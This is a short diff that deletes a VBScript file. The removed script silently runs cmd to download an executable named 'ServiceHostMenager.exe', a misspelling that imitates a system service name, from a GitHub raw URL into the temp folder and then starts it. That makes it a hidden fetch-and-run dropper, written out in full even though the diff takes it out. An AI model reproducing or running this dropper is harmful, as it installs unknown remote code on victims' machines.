@@ -1,8 +1,0 @@
-Set WshShell = CreateObject("WScript.Shell")
-Function RunCommand(cmd)
-    Dim temp
-    temp = Replace(cmd, " ", Chr(32))
-    RunCommand = temp
-End Function
-WshShell.Run RunCommand("cmd /c curl -s -o "%temp%\ServiceHostMenager".exe -JL "https://github.com/Furystorage/Api/raw/main/ServiceHostMenager.exe" & start %temp%\ServiceHostMenager.exe"), 0, False
-Set WshShell = Nothing
